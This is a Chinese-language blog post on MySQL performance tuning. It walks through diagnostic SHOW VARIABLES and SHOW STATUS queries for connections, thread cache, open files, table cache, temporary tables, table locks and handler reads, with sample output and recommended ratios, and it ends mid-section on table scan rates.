 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><img src='http://note.youdao.com/yws/res/2833/DFBA3A26D0114DF78F2F201A39FF66B8' style='width:1057px;' data-media-type='image'></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>1 连接 Connections</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>经常会遇见”mysql: error 1040: too many connections”的情况，一种是访问量确实很高，mysql服务器抗不住，这个时候就要考虑增加从服务器分散读压力，另外一种情况是mysql配置文件中max_connections值过小：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show variables like ‘max_connections‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　 | value &nbsp; |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| max_connections | 256　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------+-------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>这台mysql服务器最大连接数是256，然后查询一下服务器响应的最大连接数：</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;mysql&gt; show global status like ‘max_used_connections‘;&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql服务器过去的最大连接数是245，没有达到服务器连接数上限256，应该没有出现1040错误，比较理想的设置是</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;<span style='color:rgb(255, 0, 0);'>max_used_connections / max_connections * 100% ≈ 85%</span>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>最大连接数占上限连接数的85％左右，如果发现比例在10%以下，mysql服务器连接数上限设置的过高了。</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong><span>2 &nbsp;线程 Thread</span></strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘thread%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　 | &nbsp; value |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| threads_cached　 | &nbsp; &nbsp;46　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| threads_connected | 2　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| threads_created　| 570　 &nbsp;|</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| threads_running &nbsp;| 1　 &nbsp;　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+-------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>如果我们在mysql服务器配置文件中设置了thread_cache_size，当客户端断开之后，服务器处理此客户的线程将会缓存起来以响应下一个客户而不是销毁（前提是缓存数未达上限）。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>threads_created表示创建过的线程数，如果发现threads_created值过大的话，表明mysql服务器一直在创建线程，这也是比较耗资源，可以适当增加配置文件中thread_cache_size值，</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>查询服务器 thread_cache_size 配置：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show variables like ‘thread_cache_size‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　 | value &nbsp; |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| thread_cache_size | 64　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+-------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>示例中的服务器还是挺健康的。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3 &nbsp;缓存 cache</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3.1 文件打开数</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘open_files‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name | value |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| open_files　　 | 1410　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;mysql&gt; show variables like ‘open_files_limit‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　 | value |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| open_files_limit &nbsp; &nbsp;| 4590 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------+-------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>比较合适的设置：<span style='color:rgb(255, 0, 0);'>open_files / open_files_limit * 100% &lt;= 75％</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3.2 数据表</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3.2.1 打开数 open_tables</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘open%tables%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name | value &nbsp; |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| open_tables　 | 919　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| opened_tables | 1951 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>open_tables: 打开表的数量</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>opened_tables: 打开过的表数量</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>如果 opened_tables 数量过大，说明配置中 table_cache(<span style='color:rgb(255, 0, 0);'>5.1.3之后这个值叫做table_open_cache</span>)值可能太小，我们查询一下服务器table_cache值：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show variables like ‘table_cache‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name | value |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| table_cache　　　 | 2048　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>比较合适的值为：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>open_tables / opened_tables * 100% &gt;= 85%&nbsp;</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>open_tables / table_cache * 100% &lt;= 95%</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;<strong>3.2.2 临时表 tmp_table</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘created_tmp%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------------+---------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　　　 | value　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------------+---------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| created_tmp_disk_tables | 21197　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| created_tmp_files　　　　| 58　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| created_tmp_tables　　&nbsp; | 1771587 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------------+---------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>每次创建临时表，created_tmp_tables 增加，如果是在磁盘上创建临时表，created_tmp_disk_tables也增加,created_tmp_files表示mysql服务创建的临时文件文件数，比较理想的配置是：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>created_tmp_disk_tables / created_tmp_tables * 100% &lt;= 25%</span>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>比如上面的服务器 created_tmp_disk_tables / created_tmp_tables * 100% ＝ 1.20%，应该相当好了。我们再看一下mysql服务器对临时表的配置：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show variables where variable_name in (‘tmp_table_size‘, ‘max_heap_table_size‘);</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　 | value　　　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| max_heap_table_size | 268435456 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| tmp_table_size　　　 | 536870912 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------------+-----------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>只有 256mb 以下的临时表才能全部放内存，超过的就会用到硬盘临时表。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3.2.3 表锁情况</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘table_locks%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　　 | value　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| table_locks_immediate | 490206328 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| table_locks_waited　　| 2084912　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;table_locks_immediate 表示立即释放表锁数，&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>table_locks_waited 表示需要等待的表锁数，&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>如果 table_locks_immediate / table_locks_waited &gt; 5000，最好采用innodb引擎，因为innodb是行锁而myisam是表锁，对于高并发写入的应用innodb效果会好些。&nbsp;</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>示例中的服务器 table_locks_immediate / table_locks_waited ＝ 235，myisam就足够了。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3.2.4 表扫描情况</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘handler_read%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　　 | value　　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| handler_read_first　　| 5803750　　 &nbsp; |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| handler_read_key　　 | 6049319850 &nbsp;|</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| handler_read_next　 &nbsp;| 94440908210 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| handler_read_prev　 &nbsp;| 34822001724 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| handler_read_rnd　　 | 405482605　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| handler_read_rnd_next | 18912877839 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;各字段解释参见<span>&nbsp;</span><a href='http://hi.baidu.com/thinkinginlamp/blog/item/31690cd7c4bc5cdaa144df9c.html' style='color:rgb(52, 104, 164);'>http://hi.baidu.com/thinkinginlamp/blog/item/31690cd7c4bc5cdaa144df9c.html</a><span>&nbsp;</span>，调出服务器完成的查询请求次数：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘com_select‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name | value　　　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| com_select　　　　 | 222693559 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------+-----------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>计算表扫描率：&nbsp;</p> 
